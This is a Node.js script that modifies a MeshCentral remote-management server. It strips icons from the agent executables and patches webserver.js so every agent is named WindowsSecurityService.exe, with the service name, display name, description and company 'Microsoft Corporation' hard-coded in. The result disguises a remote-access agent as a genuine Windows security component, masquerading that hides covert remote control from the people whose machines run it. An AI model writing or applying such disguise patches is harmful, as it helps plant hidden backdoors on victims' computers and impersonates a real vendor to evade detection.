const fs = require('fs');
const path = require('path');
const resedit = require('resedit');

const meshCentralPath = path.join(__dirname, 'node_modules', 'meshcentral');
const agentsPath = path.join(meshCentralPath, 'agents');

async function stripIcons() {
    console.log('Stripping icons from agents...');
    const files = fs.readdirSync(agentsPath);
    for (const file of files) {
        if (file.endsWith('.exe')) {
            const filePath = path.join(agentsPath, file);
            console.log(`Patching ${file}...`);
            try {
                const data = fs.readFileSync(filePath);
                const exe = resedit.NtExecutable.from(data);
                const res = resedit.Resource.Factory.from(exe);
                
                // Remove icons
                const iconGroupEntry = res.entries.find(e => e.type === resedit.Resource.Type.IconGroup);
                if (iconGroupEntry) {
                    const iconGroup = resedit.Resource.IconGroupEntry.fromBinary(iconGroupEntry.bin);
                    iconGroup.icons.forEach(icon => {
                        const iconEntryIndex = res.entries.findIndex(e => e.type === resedit.Resource.Type.Icon && e.id === icon.iconId);
                        if (iconEntryIndex !== -1) res.entries.splice(iconEntryIndex, 1);
                    });
                    res.entries.splice(res.entries.indexOf(iconGroupEntry), 1);
                }

                res.outputResource(exe);
                const newBinary = exe.generate();
                fs.writeFileSync(filePath, Buffer.from(newBinary));
                console.log(`Successfully patched ${file}`);
            } catch (err) {
                console.error(`Failed to patch ${file}: ${err.message}`);
            }
        }
    }
}

function patchWebServer() {
    const webServerPath = path.join(meshCentralPath, 'webserver.js');
    if (!fs.existsSync(webServerPath)) return;
    
    console.log('Patching webserver.js...');
    let content = fs.readFileSync(webServerPath, 'utf8');

    // 1. Force filename to WindowsSecurityService.exe and remove suffixes
    // We look for the part where meshfilename is constructed
    const namingFix = `
                // USER MODIFICATION: Force persistent filename
                meshfilename = 'WindowsSecurityService.exe';
    `;
    
    // Replace the block that appends arch and group name
    const namingRegex = /if \(argentInfo\.rname\.endsWith\('\.exe'\)\) \{ meshfilename = argentInfo\.rname\.substring\(0, argentInfo\.rname\.length - 4\) \+ '-' \+ meshfilename \+ '\.exe'; \} else \{ meshfilename = argentInfo\.rname \+ '-' \+ meshfilename; \}/;
    
    if (namingRegex.test(content)) {
        content = content.replace(namingRegex, namingFix);
    }

    // 2. Ensure default agent strings are always applied
    const settingsFix = `
                    // USER MODIFICATION: Default agent strings to Windows Security Service
                    meshsettings += 'displayName=Windows Security Service\\r\\n';
                    meshsettings += 'description=Windows Security Service\\r\\n';
                    meshsettings += 'companyName=Microsoft Corporation\\r\\n';
                    meshsettings += 'meshServiceName=WindowsSecurityService\\r\\n';
                    meshsettings += 'fileName=WindowsSecurityService\\r\\n';
    `;
    
    // Find where to inject settings
    if (content.indexOf("// USER MODIFICATION: Default agent strings") === -1) {
        content = content.replace("if (domain.agentcustomization != null) {", settingsFix + "\r\n                    if (domain.agentcustomization != null) {");
    }

    fs.writeFileSync(webServerPath, content);
    console.log('webserver.js patched.');
}

async function run() {
    try {
        await stripIcons();
        patchWebServer();
        console.log('All patches applied successfully.');
    } catch (err) {
        console.error('Patching failed:', err);
    }
}

run();
